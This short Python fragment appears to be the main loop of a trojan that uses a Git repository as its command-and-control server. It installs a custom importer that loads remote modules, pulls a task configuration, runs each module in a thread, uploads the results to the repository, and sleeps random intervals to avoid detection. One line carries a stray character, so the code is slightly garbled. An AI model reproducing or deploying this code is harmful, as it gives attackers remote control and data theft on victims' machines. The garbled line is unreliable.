def module_runner(module):
  task_queue.put(1)
  result = sys.modules[module].run()
  task_queue.get()
  # store the result in our repo
  store_module_result(result)
  return
  
# main trojan loop
w sys.meta_path = [GitImporter()]
while True:
  if task_queue.empty():
    config = get_trojan_config()
    for task in config:
      t = threading.Thread(target=module_runner,args=(task['module'],))
      t.start()
      time.sleep(random.randint(1,10))
  time.sleep(random.randint(1000,10000))
